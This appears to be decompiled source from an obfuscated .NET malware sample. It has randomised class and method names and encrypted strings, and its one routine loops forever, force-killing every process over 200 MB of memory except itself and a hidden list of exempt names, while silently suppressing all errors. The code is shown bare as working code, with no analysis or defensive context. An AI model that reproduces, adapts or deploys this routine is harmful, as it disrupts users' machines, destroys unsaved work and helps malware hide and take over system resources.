using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace xNvWsvlcqg;

public static class hKwKKsNpYwA
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void LcDmPBCJvkKlh()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107462309)) && !process.ProcessName.Contains(getString_0(107462300)) && !process.ProcessName.Contains(getString_0(107462323)) && !process.ProcessName.Contains(getString_0(107462282)) && !process.ProcessName.Contains(getString_0(107462269)) && !process.ProcessName.Contains(getString_0(107462288)) && !process.ProcessName.Contains(getString_0(107462243)) && !process.ProcessName.Contains(getString_0(107462262)) && !process.ProcessName.Contains(getString_0(107462217)) && !process.ProcessName.Contains(getString_0(107462204)) && !process.ProcessName.Contains(getString_0(107462183)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static hKwKKsNpYwA()
	{
		Strings.CreateGetStringDelegate(typeof(hKwKKsNpYwA));
	}
}
